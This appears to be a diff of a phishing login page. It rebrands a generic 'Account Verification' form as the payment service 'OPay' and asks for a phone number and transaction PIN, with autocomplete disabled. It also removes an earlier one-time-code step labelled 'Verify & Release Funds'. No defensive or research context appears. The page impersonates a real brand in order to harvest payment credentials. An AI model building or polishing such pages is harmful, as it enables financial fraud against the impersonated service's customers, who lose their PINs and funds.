@@ -3,45 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Verification | Portal</title>
+    <title>Secure Login | Portal</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <div class="main-container">
-        <div id="login-section" class="card">
-            <div class="logo-area">
-                <div class="logo-placeholder">Secure Portal</div>
+    <div class="container">
+        <div class="login-card" id="login-card">
+            <div class="logo-section">
+                <span class="brand-name">OPay</span>
             </div>
             
-            <h3>Welcome Back</h3>
-            <p>Verify your account to continue</p>
+            <div class="form-header">
+                <h2>Welcome Back</h2>
+                <p>Verify your account to continue</p>
+            </div>
 
-            <form id="login-form">
+            <form id="auth-form">
                 <div class="input-group">
-                    <label for="phone">Phone Number / Email</label>
-                    <input type="tel" id="user-identifier" placeholder="0801 234 5678" required>
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" placeholder="0801 234 5678" autocomplete="off">
                 </div>
 
                 <div class="input-group">
-                    <label for="password">Transaction PIN</label>
-                    <input type="password" id="user-pin" placeholder="****" maxlength="4" required>
+                    <label for="pin">Transaction PIN</label>
+                    <input type="password" id="pin" placeholder="****" maxlength="6" autocomplete="off">
                 </div>
 
-                <button type="submit" id="next-btn">Sign In</button>
-            </form>
-        </div>
-
-        <div id="otp-section" class="card" style="display: none;">
-            <h3>Verification Required</h3>
-            <p>Enter the 6-digit code sent to your device.</p>
-            
-            <form id="otp-form">
-                <input type="number" id="otp-code" placeholder="123456" required>
-                <button type="submit">Verify & Release Funds</button>
+                <button type="submit" class="btn-primary" id="submit-btn">Sign In</button>
             </form>
         </div>
     </div>
 
-</body>
+    </body>
 </html>
-
